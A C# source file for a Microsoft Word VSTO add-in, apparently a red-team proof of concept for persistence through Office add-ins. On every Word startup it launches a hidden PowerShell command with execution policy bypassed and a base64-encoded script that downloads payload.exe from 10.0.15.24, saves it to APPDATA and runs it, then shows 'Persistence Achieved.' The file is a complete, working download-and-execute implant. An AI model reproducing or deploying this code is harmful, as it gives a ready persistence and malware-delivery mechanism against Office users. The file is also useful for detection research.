using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml.Linq;
using Word = Microsoft.Office.Interop.Word;
using Office = Microsoft.Office.Core;
using Microsoft.Office.Tools.Word;
using System.Windows.Forms;

namespace persist
{
    public partial class ThisAddIn
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            string ps_deliver_and_run;
            ps_deliver_and_run = "/c powershell.exe -window hidden -nol -noni -nop -ep bypass -ec JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADEANQAuADIANAAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAiADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAdQByAGwALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACIAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAoACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgApADsA";
            System.Diagnostics.Process.Start("cmd.exe", ps_deliver_and_run);

            MessageBox.Show("Persistence Achieved.", "DI POC");
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
        }

        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }
        
        #endregion
    }
}
